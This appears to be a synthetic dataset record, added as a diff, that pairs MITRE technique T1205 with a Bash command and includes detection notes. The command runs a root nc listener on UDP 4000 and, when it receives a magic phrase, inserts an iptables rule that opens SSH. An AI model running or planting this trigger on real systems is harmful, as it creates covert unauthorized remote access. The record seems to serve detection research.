@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "sudo bash -c 'nc -lukp 4000 | grep -m1 -x \"MAGIC_OPEN_SSH\" && iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT'",
+  "explanation": "Listens on UDP/4000 for an exact magic phrase; upon detection, immediately opens SSH by inserting an iptables ACCEPT rule. Requires root (sudo). Detection: monitor for unauthorized listeners on odd ports and sudden iptables rule insertions.",
+  "rationale_steps": [
+    "Uses nc in listen mode to wait for a specific trigger payload.",
+    "Minimal parsing via grep to avoid obfuscation.",
+    "On match, modifies firewall to enable hidden functionality (SSH access).",
+    "Detect via process monitoring for nc listeners and firewall change auditing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-753dbc1f-87c01879",
+  "source_prompt_hash": "753dbc1f",
+  "timestamp_utc": "2025-09-30T05:37:53.725688Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
